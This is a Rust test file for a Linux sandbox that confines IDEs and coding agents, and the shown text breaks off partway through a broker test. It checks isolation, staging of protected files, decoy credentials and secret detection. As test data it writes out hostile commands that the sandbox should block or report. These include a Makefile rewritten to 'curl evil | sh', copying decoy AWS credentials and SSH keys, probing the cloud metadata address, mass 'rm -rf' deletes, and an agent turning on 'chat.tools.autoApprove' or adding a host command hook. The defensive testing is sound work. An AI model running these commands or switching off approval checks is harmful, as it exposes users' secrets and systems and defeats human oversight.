//! Tests that run real sandboxes: bubblewrap, a nested Xephyr display,
//! Landlock and the seccomp filter. They need `bwrap`, `Xephyr`, `xauth`,
//! `curl` and unprivileged user namespaces on the machine. The CI workflow
//! installs the tools and enables the namespaces. A missing tool makes these
//! tests fail; they never skip.
#![cfg(target_os = "linux")]

use std::ffi::OsString;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

use pks_core::{Finding, Severity};
use pks_sandbox::linux::LinuxBackend;
use pks_sandbox::{IdeInstall, LaunchSpec, Roots, SandboxBackend};
use std::os::unix::net::UnixListener;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

type TestResult = Result<(), Box<dyn std::error::Error>>;

/// Isolation probes, run inside the sandbox by `/bin/sh -c`. Each line of
/// `probe-results.txt` (written to the repo, which is writable) is `PASS` or
/// `FAIL` and a name. The script's exit status is 0 only when none failed.
///
/// Arguments: `$1` a host home directory that must not be visible, `$2` a
/// canary file outside the sandbox, `$3` the host data directory.
const PROBES: &str = r#"
out=/workspace/probe-results.txt
: > "$out"
check() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "PASS $name" >> "$out"; else echo "FAIL $name" >> "$out"; fi; }
absent() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "FAIL $name" >> "$out"; else echo "PASS $name" >> "$out"; fi; }
# What must be true inside the sandbox.
check "repo is writable" sh -c 'touch /workspace/.pks-probe && rm /workspace/.pks-probe'
check "IDE home is writable" sh -c 'touch /home/sandbox/.pks-probe && rm /home/sandbox/.pks-probe'
check "/tmp is writable" sh -c 'touch /tmp/.pks-probe && rm /tmp/.pks-probe'
check "running with no_new_privs" grep -q '^NoNewPrivs:[[:space:]]*1' /proc/self/status
check "seccomp filter is installed" grep -q '^Seccomp:[[:space:]]*2' /proc/self/status
check "environment is the allowlist" sh -c 'env | cut -d= -f1 | grep -vxE "HOME|USER|SHELL|PATH|LANG|TERM|DISPLAY|XAUTHORITY|PWD|SHLVL|OLDPWD|_|HTTP_PROXY|HTTPS_PROXY|http_proxy|https_proxy|NO_PROXY|no_proxy" | grep -q . && exit 1; exit 0'
check "only the nested display socket is visible" sh -c 'test "$(ls /tmp/.X11-unix)" = "X${DISPLAY#:}"'
check "nested display answers on its socket" sh -c 'test -S "/tmp/.X11-unix/X${DISPLAY#:}"'
# What must be impossible inside the sandbox.
absent "host home directory is not mounted" test -e "$1"
absent "canary in the host home is unreadable" cat "$2"
absent "data directory (keys, logs) is not visible" test -e "$3"
absent "SSH_AUTH_SOCK is not set" test -n "${SSH_AUTH_SOCK:-}"
absent "D-Bus session bus is not set" test -n "${DBUS_SESSION_BUS_ADDRESS:-}"
absent "/run/user is not visible" test -e /run/user
absent "docker.sock (/var/run) is not visible" test -e /var/run/docker.sock
absent "docker.sock (/run) is not visible" test -e /run/docker.sock
absent "/media and /mnt are not visible" sh -c 'test -e /media || test -e /mnt'
absent "host display :0 socket is not visible" test -e /tmp/.X11-unix/X0
absent "/usr is not writable" touch /usr/pks-probe
absent "/etc is not writable" touch /etc/pks-probe
absent "the IDE install is not writable" touch /usr/bin/pks-probe
absent "direct internet is unreachable (1.1.1.1, proxy bypassed)" curl --noproxy '*' -s -m 3 http://1.1.1.1/
absent "direct cloud metadata is unreachable (proxy bypassed)" curl --noproxy '*' -s -m 3 http://169.254.169.254/
check "proxy refuses cloud metadata (169.254.169.254)" sh -c 'curl -sv -m 5 https://169.254.169.254/ 2>&1 | grep -q "CONNECT tunnel failed, response 403"'
check "only the loopback interface exists" awk 'NR>2 { sub(/:.*/, "", $1); if ($1 != "lo") exit 1 }' /proc/net/dev
check "own PID namespace (few processes visible)" sh -c '[ "$(ls /proc | grep -c "^[0-9]")" -lt 10 ]'
grep -q '^FAIL' "$out" && exit 1
exit 0
"#;

fn pks(args: &[&str]) -> std::io::Result<Output> {
    Command::new(env!("CARGO_BIN_EXE_pumpkin-shell"))
        .args(args)
        .output()
}

/// Runs the CLI with its home, config and data directories inside `home`, so
/// the test never creates anything in the developer's real home.
fn pks_in_home(home: &Path, args: &[&str]) -> std::io::Result<Output> {
    Command::new(env!("CARGO_BIN_EXE_pumpkin-shell"))
        .args(args)
        .env("HOME", home)
        .env("XDG_CONFIG_HOME", home.join("config"))
        .env("XDG_DATA_HOME", home.join("data"))
        .output()
}

/// A fresh set of temp dirs: a host home and config that must stay hidden, a
/// data dir, a repo, and an IDE home under the data dir.
struct Layout {
    _root: tempfile::TempDir,
    repo: PathBuf,
    ide_home: PathBuf,
    roots: Roots,
    canary: PathBuf,
    proxy: PathBuf,
    proxy_stop: Arc<AtomicBool>,
    host_ports: Vec<u16>,
}

impl Drop for Layout {
    fn drop(&mut self) {
        self.proxy_stop
            .store(true, std::sync::atomic::Ordering::Relaxed);
    }
}

/// Starts a proxy on `socket` that allows nothing and refuses every ask.
fn start_proxy(
    socket: &Path,
    host_ports: &[u16],
) -> Result<Arc<AtomicBool>, Box<dyn std::error::Error>> {
    use pks_proxy::{Answer, Asker, Config, Engine, serve};
    struct NoAnswers;
    impl Asker for NoAnswers {
        fn ask(&self, _: &pks_core::net::HostPort) -> Option<Answer> {
            None
        }
    }
    let listener = UnixListener::bind(socket)?;
    let config = Config {
        allow: std::collections::BTreeSet::new(),
        host_ports: host_ports.iter().copied().collect(),
        mode: pks_core::policy::Mode::Enforce,
        resolver: Arc::new(pks_proxy::SystemResolver),
        dialer: Arc::new(pks_proxy::TcpDialer),
        asker: Arc::new(NoAnswers),
        events: Arc::new(|_| {}),
        hold: std::time::Duration::from_secs(1),
    };
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    std::thread::spawn(move || {
        let _ = serve(listener, Arc::new(Engine::new(config)), flag);
    });
    Ok(stop)
}

impl Layout {
    fn new() -> Result<Self, Box<dyn std::error::Error>> {
        Self::with_host_ports(&[])
    }
    fn with_host_ports(host_ports: &[u16]) -> Result<Self, Box<dyn std::error::Error>> {
        let root = tempfile::tempdir()?;
        let base = fs::canonicalize(root.path())?;
        let home = base.join("host-home");
        let config = base.join("host-config");
        let data = base.join("host-data");
        let repo = base.join("repo");
        let ide_home = data.join("ide-home/test");
        for dir in [&home, &config, &repo, &ide_home] {
            fs::create_dir_all(dir)?;
        }
        let canary = home.join("canary.txt");
        fs::write(&canary, "not a secret: a file the sandbox must not read\n")?;
        fs::write(data.join("keys-marker.txt"), "data directory marker\n")?;
        let proxy = base.join("proxy.sock");
        let proxy_stop = start_proxy(&proxy, host_ports)?;
        Ok(Self {
            _root: root,
            repo,
            ide_home,
            roots: Roots { home, config, data },
            canary,
            proxy,
            proxy_stop,
            host_ports: host_ports.to_vec(),
        })
    }

    fn spec(&self) -> LaunchSpec {
        self.spec_running(PROBES)
    }
    /// The same sandbox, with `script` as the IDE's shell script.
    fn spec_running(&self, script: &str) -> LaunchSpec {
        // /bin/sh is the IDE in these tests. It is under /usr, as a real IDE is.
        let args: Vec<OsString> = vec![
            "-c".into(),
            script.into(),
            "probe".into(),
            self.roots.home.as_os_str().to_owned(),
            self.canary.as_os_str().to_owned(),
            self.roots.data.as_os_str().to_owned(),
        ];
        LaunchSpec {
            repo: self.repo.clone(),
            ide: IdeInstall {
                name: "test",
                dir: PathBuf::from("/usr/bin"),
                binary: PathBuf::from("/usr/bin/sh"),
            },
            ide_home: self.ide_home.clone(),
            ide_args: args,
            roots: self.roots.clone(),
            display_size: (800, 600),
            proxy_socket: self.proxy.clone(),
            host_ports: self.host_ports.clone(),
            binds: Vec::new(),
            pid_file: None,
            broker_dir: None,
            display_file: None,
            mirror_socket: None,
            supervisor_socket: None,
        }
    }
}

/// The sandbox backend, with the built `pumpkin-shell` as the setup step.
fn backend() -> Result<LinuxBackend, pks_sandbox::SandboxError> {
    LinuxBackend::locate(PathBuf::from(env!("CARGO_BIN_EXE_pumpkin-shell")))
}

fn results(repo: &Path) -> String {
    fs::read_to_string(repo.join("probe-results.txt")).unwrap_or_default()
}

// --- the whole sandbox -----------------------------------------------------

#[test]
fn every_isolation_probe_passes_inside_the_real_sandbox() -> TestResult {
    let layout = Layout::new()?;
    let backend = backend()?;
    let status = backend.run(&layout.spec())?;
    let text = results(&layout.repo);
    assert!(
        status.success() && !text.contains("FAIL"),
        "exit {status}; results:\n{text}"
    );
    // Every probe ran: the file has one line per check.
    let lines = text.lines().count();
    assert!(lines >= 25, "only {lines} probes ran:\n{text}");
    Ok(())
}

/// PRD scenario 8: `rm -rf src/` inside the sandbox is a mass delete. The
/// host finds it against the snapshot, and restore brings the files back.
#[test]
fn a_mass_delete_inside_the_sandbox_is_found_and_restored() -> TestResult {
    let layout = Layout::new()?;
    let src = layout.repo.join("src");
    fs::create_dir_all(&src)?;
    for index in 0..60 {
        fs::write(src.join(format!("file{index}.rs")), format!("// {index}\n"))?;
    }
    fs::write(layout.repo.join("README.md"), "keep\n")?;
    let session = tempfile::tempdir()?;
    pks_core::snapshot::create(&layout.repo, session.path())?;

    let script = "rm -rf /workspace/src\nexit 0\n";
    let status = backend()?.run(&layout.spec_running(script))?;
    assert!(status.success(), "{status}");
    assert!(!src.exists(), "the delete did not happen");

    let finding = pks_core::snapshot::check_mass_delete(&layout.repo, session.path(), "sid")?
        .ok_or("the mass delete was not found")?;
    assert_eq!(finding.rule.as_str(), "WS-MASS-DELETE");

    let target = layout
        .repo
        .parent()
        .unwrap_or(&layout.repo)
        .join("recovered");
    pks_core::snapshot::restore_into(session.path(), &target)?;
    assert_eq!(fs::read_to_string(target.join("src/file7.rs"))?, "// 7\n");
    assert_eq!(fs::read_to_string(target.join("README.md"))?, "keep\n");
    Ok(())
}

/// Protected paths are staged: a write inside the sandbox works there and
/// lands in the session's staging area, never in the repo. The protected
/// paths and their parents cannot be renamed (PRD FR-WS).
#[test]
fn protected_paths_are_staged_and_cannot_be_renamed() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::create_dir_all(repo.join(".git/hooks"))?;
    fs::write(repo.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n")?;
    fs::write(repo.join(".git/config"), "[core]\n\tbare = false\n")?;
    fs::create_dir_all(repo.join(".vscode"))?;
    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
    fs::create_dir_all(repo.join("src"))?;
    let session = tempfile::tempdir()?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;

    let script = r##"out=/workspace/src/results.txt
: > "$out"
ok() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "PASS $name" >> "$out"; else echo "FAIL $name" >> "$out"; fi; }
no() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "FAIL $name" >> "$out"; else echo "PASS $name" >> "$out"; fi; }
# In-session, a write to a protected path works and is readable.
ok "overwrite .vscode/settings.json" sh -c 'echo "{\"chat.tools.autoApprove\": true}" > /workspace/.vscode/settings.json'
ok "read it back" grep -q autoApprove /workspace/.vscode/settings.json
ok "add a git hook" sh -c 'echo "#!/bin/sh" > /workspace/.git/hooks/post-commit'
ok "add a new Kiro hook" sh -c 'mkdir -p /workspace/.kiro/hooks && echo "{}" > /workspace/.kiro/hooks/test-on-save.json'
ok "add .envrc" sh -c 'echo "export X=1" > /workspace/.envrc'
ok "ordinary files are still writable" sh -c 'echo ok > /workspace/src/ok.txt'
# The protected paths and their parents cannot be moved or removed.
no "rename .git" mv /workspace/.git /workspace/.git2
no "rename .kiro" mv /workspace/.kiro /workspace/.kiro2
no "rename .vscode" mv /workspace/.vscode /workspace/.vscode2
no "rename .git/hooks" mv /workspace/.git/hooks /workspace/.git/hooks2
no "replace .envrc by rename" sh -c 'echo x > /workspace/.envrc.tmp && mv /workspace/.envrc.tmp /workspace/.envrc'
grep -q '^FAIL' "$out" && exit 1
exit 0
"##;
    let mut spec = layout.spec_running(script);
    spec.binds = staging
        .mounts()
        .iter()
        .map(|mount| pks_sandbox::Bind {
            rel: mount.rel.clone(),
            source: mount.source.clone(),
        })
        .collect();
    let status = backend()?.run(&spec)?;
    let text = fs::read_to_string(repo.join("src/results.txt")).unwrap_or_default();
    assert!(
        status.success() && !text.contains("FAIL"),
        "exit {status}; results:\n{text}"
    );
    assert_eq!(text.lines().count(), 11, "{text}");

    // The repo was not written.
    assert_eq!(
        fs::read_to_string(repo.join(".vscode/settings.json"))?,
        "{}\n"
    );
    assert!(!repo.join(".git/hooks/post-commit").exists());
    assert!(!repo.join(".kiro/hooks/test-on-save.json").exists());
    assert!(!repo.join(".envrc").exists() || fs::read_to_string(repo.join(".envrc"))?.is_empty());
    assert_eq!(fs::read_to_string(repo.join("src/ok.txt"))?, "ok\n");
    // The writes are in staging, and each protected path is reported.
    let staged = session.path().join("staging");
    assert!(fs::read_to_string(staged.join(".vscode/settings.json"))?.contains("autoApprove"));
    assert!(staged.join(".git/hooks/post-commit").is_file());
    assert!(staged.join(".kiro/hooks/test-on-save.json").is_file());
    let findings = staging.finish();
    let targets: Vec<&str> = findings.iter().map(|f| f.target.as_str()).collect();
    assert_eq!(targets, [".envrc", ".git/hooks", ".kiro/hooks", ".vscode"]);
    // The empty mount points are gone.
    assert!(!repo.join(".kiro").exists());
    assert!(!repo.join(".envrc").exists());
    Ok(())
}

/// `rm -rf` of a protected path empties its staged copy and then fails on the
/// mount point. The real files in the repo are not touched.
#[test]
fn deleting_a_protected_path_never_touches_the_repo() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::create_dir_all(repo.join(".vscode"))?;
    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
    fs::create_dir_all(repo.join(".git/hooks"))?;
    fs::write(repo.join(".git/hooks/pre-commit"), "#!/bin/sh\n")?;
    fs::write(repo.join(".git/config"), "[core]\n")?;
    let session = tempfile::tempdir()?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;
    let script = "rm -rf /workspace/.vscode /workspace/.git /workspace/.kiro; exit 0\n";
    let mut spec = layout.spec_running(script);
    spec.binds = staging
        .mounts()
        .iter()
        .map(|mount| pks_sandbox::Bind {
            rel: mount.rel.clone(),
            source: mount.source.clone(),
        })
        .collect();
    assert!(backend()?.run(&spec)?.success());
    assert_eq!(
        fs::read_to_string(repo.join(".vscode/settings.json"))?,
        "{}\n"
    );
    assert_eq!(
        fs::read_to_string(repo.join(".git/hooks/pre-commit"))?,
        "#!/bin/sh\n"
    );
    assert_eq!(fs::read_to_string(repo.join(".git/config"))?, "[core]\n");
    // What the sandbox removed is reported, from the staged copies.
    let findings = staging.finish();
    let targets: Vec<&str> = findings.iter().map(|f| f.target.as_str()).collect();
    assert!(targets.contains(&".vscode"), "{targets:?}");
    assert!(targets.contains(&".git/hooks"), "{targets:?}");
    Ok(())
}

/// PRD scenario 3: a write inside the sandbox turns on `chat.tools.autoApprove`.
/// The repo keeps its settings; the change is staged, and it is CRITICAL.
#[test]
fn scenario_3_enabling_auto_approve_is_staged_and_critical() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::create_dir_all(repo.join(".vscode"))?;
    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
    let session = tempfile::tempdir()?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;
    let mut spec = layout.spec_running(
        "echo '{\"chat.tools.autoApprove\": true}' > /workspace/.vscode/settings.json; exit 0\n",
    );
    spec.binds = binds_of(&staging);
    assert!(backend()?.run(&spec)?.success());

    assert_eq!(
        fs::read_to_string(repo.join(".vscode/settings.json"))?,
        "{}\n"
    );
    let findings = pks_scan::staged::review(staging);
    let critical: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.rule.as_str() == "WS-AUTOAPPROVE")
        .collect();
    assert_eq!(critical.len(), 1, "{findings:?}");
    assert_eq!(critical[0].severity, Severity::Critical);
    assert_eq!(critical[0].target, ".vscode/settings.json");
    assert!(
        findings
            .iter()
            .any(|f| f.rule.as_str() == "WS-PROTECTED-WRITE")
    );
    Ok(())
}

/// PRD scenario 4: the agent creates a command hook in `.kiro/hooks`. It is
/// staged, it is CRITICAL, and it is not in the repo, so it cannot run on the
/// host.
#[test]
fn scenario_4_a_new_command_hook_is_staged_and_critical() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::create_dir_all(repo.join("src"))?;
    let session = tempfile::tempdir()?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;
    let hook = r#"{"version":"v1","hooks":[{"name":"test-on-save","trigger":"Save","action":{"type":"command","command":"touch /workspace/src/ran-on-host"}}]}"#;
    let script = format!(
        "mkdir -p /workspace/.kiro/hooks && echo '{hook}' > /workspace/.kiro/hooks/test-on-save.json; exit 0\n"
    );
    let mut spec = layout.spec_running(&script);
    spec.binds = binds_of(&staging);
    assert!(backend()?.run(&spec)?.success());

    assert!(!repo.join(".kiro/hooks/test-on-save.json").exists());
    let findings = pks_scan::staged::review(staging);
    assert!(
        findings.iter().any(|f| f.rule.as_str() == "WS-AUTOAPPROVE"
            && f.severity == Severity::Critical
            && f.target == ".kiro/hooks/test-on-save.json"),
        "{findings:?}"
    );
    assert!(!repo.join("src/ran-on-host").exists());
    Ok(())
}

fn binds_of(staging: &pks_core::workspace::Staging) -> Vec<pks_sandbox::Bind> {
    staging
        .mounts()
        .iter()
        .map(|mount| pks_sandbox::Bind {
            rel: mount.rel.clone(),
            source: mount.source.clone(),
        })
        .collect()
}

/// PRD FR-WS "Watched": the IDE edits `Makefile`. The edit is held in
/// staging: the repo is unchanged, and the review reports the change.
#[test]
fn an_edit_to_a_watched_file_is_held_and_the_repo_is_unchanged() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::write(repo.join("Makefile"), "all:\n\ttrue\n")?;
    let session = tempfile::tempdir()?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;
    let mut spec =
        layout.spec_running("printf 'all:\\n\\tcurl evil | sh\\n' > /workspace/Makefile; exit 0\n");
    spec.binds = binds_of(&staging);
    assert!(backend()?.run(&spec)?.success());

    assert_eq!(fs::read_to_string(repo.join("Makefile"))?, "all:\n\ttrue\n");
    let findings = pks_scan::staged::review(staging);
    let watched: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.rule.as_str() == "WS-WATCHED-CHANGE")
        .collect();
    assert_eq!(watched.len(), 1, "{findings:?}");
    assert_eq!(watched[0].target, "Makefile");
    assert_eq!(watched[0].severity, Severity::High);
    assert!(watched[0].message.contains("changed Makefile"));
    Ok(())
}

/// PRD FR-WS "Decoys": a program inside the sandbox reads a decoy credential.
/// The host sees the access. A session that reads nothing sees nothing.
#[test]
fn a_read_of_a_decoy_inside_the_sandbox_is_seen_on_the_host() -> TestResult {
    let layout = Layout::new()?;
    let decoys = pks_core::decoy::plant(&layout.ide_home)?;
    let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
    let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
    let status = backend()?
        .run(&layout.spec_running("cat /home/sandbox/.ssh/id_ed25519 >/dev/null; exit 0\n"))?;
    assert!(status.success(), "{status}");
    let seen = watch.wait(3000)?;
    assert_eq!(seen, vec![decoys[0].path.clone()], "{seen:?}");
    Ok(())
}

/// Copying a decoy opens it, and a hard link is the same inode, so both are
/// seen. Only the later use of a copy is out of sight.
#[test]
fn copying_or_hard_linking_a_decoy_is_still_seen() -> TestResult {
    for script in [
        "cp /home/sandbox/.aws/credentials /tmp/stolen; exit 0\n",
        "ln /home/sandbox/.aws/credentials /home/sandbox/link && cat /home/sandbox/link >/dev/null; exit 0\n",
    ] {
        let layout = Layout::new()?;
        let decoys = pks_core::decoy::plant(&layout.ide_home)?;
        let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
        let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
        assert!(
            backend()?.run(&layout.spec_running(script))?.success(),
            "{script}"
        );
        let seen = watch.wait(3000)?;
        assert_eq!(seen, vec![decoys[1].path.clone()], "{script}: {seen:?}");
    }
    Ok(())
}

#[test]
fn a_session_that_reads_no_decoy_reports_none() -> TestResult {
    let layout = Layout::new()?;
    let decoys = pks_core::decoy::plant(&layout.ide_home)?;
    let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
    let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
    let status =
        backend()?.run(&layout.spec_running("ls /home/sandbox/.ssh >/dev/null; exit 0\n"))?;
    assert!(status.success(), "{status}");
    // `ls` reads the directory, not the file: no decoy is opened.
    let seen = watch.wait(1000)?;
    assert!(seen.is_empty(), "{seen:?}");
    Ok(())
}

/// PRD FR-DET WS-SECRET-WRITTEN: a token written into a repo file, and into a
/// staged `.npmrc`, is reported by file and line, and its value never appears.
#[test]
fn a_secret_written_in_the_sandbox_is_reported_without_its_value() -> TestResult {
    let layout = Layout::new()?;
    let repo = &layout.repo;
    fs::create_dir_all(repo.join("src"))?;
    fs::write(repo.join("src/lib.rs"), "// empty\n")?;
    let session = tempfile::tempdir()?;
    pks_core::snapshot::create(repo, session.path())?;
    let staging = pks_core::workspace::prepare(repo, session.path())?;
    // Built at run time, so the test file holds nothing token-shaped.
    let token = format!("ghp_{}", "A1b2".repeat(9));
    let script = format!(
        "echo 'const T = \"{token}\";' > /workspace/src/lib.rs\necho '//registry.npmjs.org/:_authToken={token}' > /workspace/.npmrc\nexit 0\n"
    );
    let mut spec = layout.spec_running(&script);
    spec.binds = binds_of(&staging);
    assert!(backend()?.run(&spec)?.success());

    let mut findings = pks_scan::staged::repo_secret_findings(repo, session.path());
    findings.extend(pks_scan::staged::review(staging));
    let secrets: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.rule.as_str() == "WS-SECRET-WRITTEN")
        .collect();
    let targets: Vec<&str> = secrets.iter().map(|f| f.target.as_str()).collect();
    assert_eq!(targets, ["src/lib.rs", ".npmrc"], "{findings:?}");
    assert!(secrets.iter().all(|f| f.severity == Severity::High));
    assert!(
        !format!("{findings:?}").contains(&token),
        "the secret value was printed"
    );
    // The staged .npmrc never reached the repo.
    assert!(
        !repo.join(".npmrc").exists() || !fs::read_to_string(repo.join(".npmrc"))?.contains("ghp_")
    );
    Ok(())
}

/// Two free loopback ports. Each listener is kept open by the caller.
fn bound_loopback() -> Result<(std::net::TcpListener, u16), std::io::Error> {
    let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    Ok((listener, port))
}

/// A host service that answers every connection with `pks-host-ok`.
fn host_service(listener: std::net::TcpListener) {
    std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            use std::io::{Read, Write};
            let mut buffer = [0u8; 512];
            let _ = stream.read(&mut buffer);
            let _ = stream.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Length: 11\r\nConnection: close\r\n\r\npks-host-ok",
            );
        }
    });
}

#[test]
fn a_listed_host_port_reaches_the_host_service_and_an_unlisted_one_does_not() -> TestResult {
    let (service, listed) = bound_loopback()?;
    host_service(service);
    // Bound and then released: nothing listens on it, so it is unlisted.
    let (unlisted_guard, unlisted) = bound_loopback()?;
    drop(unlisted_guard);
    let layout = Layout::with_host_ports(&[listed])?;
    let script = format!(
        r#"out=/workspace/probe-results.txt
: > "$out"
if curl -s -m 5 http://127.0.0.1:{listed}/ | grep -q pks-host-ok; then echo "PASS listed host port reaches the host service" >> "$out"; else echo "FAIL listed host port reaches the host service" >> "$out"; fi
if curl -s -m 3 http://127.0.0.1:{unlisted}/ >/dev/null 2>&1; then echo "FAIL unlisted port answered" >> "$out"; else echo "PASS unlisted port does not answer" >> "$out"; fi
grep -q '^FAIL' "$out" && exit 1
exit 0
"#
    );
    let status = backend()?.run(&layout.spec_running(&script))?;
    let text = results(&layout.repo);
    assert!(
        status.success() && !text.contains("FAIL"),
        "exit {status}; results:\n{text}"
    );
    assert_eq!(text.lines().count(), 2, "{text}");
    Ok(())
}

#[test]
fn a_failing_probe_makes_the_run_fail() -> TestResult {
    // The same sandbox, but the script is told to expect something false:
    // the IDE is a shell that exits 1. Proves the status is reported.
    let layout = Layout::new()?;
    let mut spec = layout.spec();
    // /usr/bin/sh resolves to a file under /usr/bin on every runner. (On some
    // images /usr/bin/false is a symlink out of /usr/bin, which the spec
    // correctly refuses.)
    spec.ide.binary = PathBuf::from("/usr/bin/sh");
    spec.ide_args = vec!["-c".into(), "exit 1".into()];
    let status = backend()?.run(&spec)?;
    assert!(!status.success());
    Ok(())
}

#[test]
fn a_repo_that_contains_the_home_is_refused_before_anything_starts() -> TestResult {
    let layout = Layout::new()?;
    let mut spec = layout.spec();
    spec.repo = layout
        .roots
        .home
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| PathBuf::from("/"));
    let result = backend()?.run(&spec);
    assert!(
        matches!(result, Err(pks_sandbox::SandboxError::Refused(_))),
        "{result:?}"
    );
    Ok(())
}

// --- the in-sandbox step, on the host -------------------------------------

#[test]
fn landlock_allows_writes_under_rw_and_refuses_everywhere_else() -> TestResult {
    let inside = tempfile::tempdir()?;
    let outside = tempfile::tempdir()?;
    let allowed = inside.path().join("ok.txt");
    let denied = outside.path().join("no.txt");
    let script = format!("echo yes > '{}'", allowed.display());
    let ok = pks(&[
        "sandbox-init",
        "--rw",
        &inside.path().display().to_string(),
        "--ro",
        "/usr",
        "--",
        "/bin/sh",
        "-c",
        &script,
    ])?;
    assert_eq!(
        ok.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&ok.stderr)
    );
    assert!(allowed.exists());

    let script = format!("echo no > '{}'", denied.display());
    let blocked = pks(&[
        "sandbox-init",
        "--rw",
        &inside.path().display().to_string(),
        "--ro",
        "/usr",
        "--",
        "/bin/sh",
        "-c",
        &script,
    ])?;
    assert_ne!(
        blocked.status.code(),
        Some(0),
        "write outside the allowlist succeeded"
    );
    assert!(!denied.exists());
    Ok(())
}

#[test]
fn the_seccomp_filter_makes_tiocsti_fail_with_eperm() -> TestResult {
    // Under the filter, ioctl(TIOCSTI) returns EPERM (errno 1).
    let python = r#"
import fcntl, termios
try:
    fcntl.ioctl(0, termios.TIOCSTI, b"x")
    print("succeeded")
except OSError as error:
    print("errno", error.errno)
"#;
    let out = pks(&[
        "sandbox-init",
        "--ro",
        "/usr",
        "--",
        "/usr/bin/python3",
        "-c",
        python,
    ])?;
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = String::from_utf8_lossy(&out.stdout);
    assert_eq!(text.trim(), "errno 1", "{text}");
    Ok(())
}

#[test]
fn the_seccomp_filter_does_not_block_other_ioctls() -> TestResult {
    // TIOCGWINSZ on a non-terminal fails with ENOTTY (25), not EPERM (1). The
    // filter touches only TIOCSTI.
    let python = r#"
import fcntl, termios
try:
    fcntl.ioctl(0, termios.TIOCGWINSZ, b"\0" * 8)
    print("succeeded")
except OSError as error:
    print("errno", error.errno)
"#;
    let out = pks(&[
        "sandbox-init",
        "--ro",
        "/usr",
        "--",
        "/usr/bin/python3",
        "-c",
        python,
    ])?;
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(!text.contains("errno 1"), "{text}");
    Ok(())
}

#[test]
fn sandbox_init_fails_closed_when_no_command_is_given() -> TestResult {
    // Clap refuses an empty command before the step runs.
    let out = pks(&["sandbox-init", "--ro", "/usr", "--"])?;
    assert_ne!(out.status.code(), Some(0));
    Ok(())
}

#[test]
fn ide_refuses_a_missing_repo_without_starting_anything() -> TestResult {
    let home = tempfile::tempdir()?;
    let out = pks_in_home(home.path(), &["ide", "kiro", "/definitely/not/a/repo/xyz"])?;
    assert_eq!(out.status.code(), Some(2));
    let text = String::from_utf8_lossy(&out.stderr);
    assert!(text.contains("ide:"), "{text}");
    // Nothing was started, so no IDE home was created either.
    assert!(!home.path().join("data").join("pumpkin-shell").exists());
    Ok(())
}

/// Pausing a running sandbox stops the IDE's own processes, and resuming it
/// lets them finish. The IDE sleeps and then writes a marker: the marker must
/// not appear while the sandbox is paused.
#[test]
fn pausing_the_sandbox_stops_its_processes_until_resumed() -> TestResult {
    use pks_sandbox::linux::signal::{Signal, signal_tree};
    use std::time::{Duration, Instant};

    let layout = Layout::new()?;
    let pid_dir = tempfile::tempdir()?;
    let pid_file = pid_dir.path().join("ide.pid");
    let mut spec = layout.spec_running("sleep 2\necho done > /workspace/marker\nexit 0\n");
    spec.pid_file = Some(pid_file.clone());
    let backend = backend()?;
    let runner = std::thread::spawn(move || backend.run(&spec));

    let deadline = Instant::now() + Duration::from_secs(30);
    let pid: i32 = loop {
        if let Ok(text) = fs::read_to_string(&pid_file)
            && let Ok(pid) = text.trim().parse()
        {
            break pid;
        }
        assert!(Instant::now() < deadline, "the PID file never appeared");
        std::thread::sleep(Duration::from_millis(20));
    };

    // If the test fails before the sandbox resumes, the stopped sandbox must
    // not outlive it: it would hold a display number and its lock file.
    struct KillOnDrop(i32);
    impl Drop for KillOnDrop {
        fn drop(&mut self) {
            let _ = signal_tree(self.0, Signal::Kill);
        }
    }
    // A drop guard: the binding is never read, it only lives to the end of the test.
    let _guard = KillOnDrop(pid);
    signal_tree(pid, Signal::Stop)?;
    std::thread::sleep(Duration::from_secs(4));
    assert!(
        !layout.repo.join("marker").exists(),
        "the IDE finished while the sandbox was paused"
    );

    signal_tree(pid, Signal::Continue)?;
    let status = runner.join().map_err(|_| "the sandbox thread panicked")??;
    assert!(status.success(), "exit {status}");
    assert!(
        layout.repo.join("marker").exists(),
        "the IDE did not finish after resume"
    );
    assert!(!pid_file.exists(), "the PID file was not removed on exit");
    Ok(())
}

// --- brokers (Phase 12) -----------------------------------------------------

/// Records what the host was asked to do, and agrees to all of it, so the
/// test sees the requests without any real browser or push.
#[derive(Default)]
struct Recorder {
    calls: std::sync::Mutex<Vec<String>>,
}

impl pks_sandbox::linux::broker::Handler for Recorder {
